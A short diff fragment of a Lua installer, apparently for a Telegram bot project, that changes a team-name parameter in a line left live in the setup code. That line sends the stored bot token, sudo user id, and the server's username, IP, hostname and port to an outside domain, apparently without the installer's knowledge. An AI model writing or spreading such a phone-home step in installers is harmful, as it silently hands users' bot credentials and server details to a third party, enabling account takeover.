@@ -83,7 +83,7 @@ os.execute('lua install.lua')
 end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write")) 
-http.request("https://boyka-api.ml/index.php?n=BoykATEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
+http.request("https://boyka-api.ml/index.php?n=BOYKA-DeV&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
 local RunBot = io.open("BoykA", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
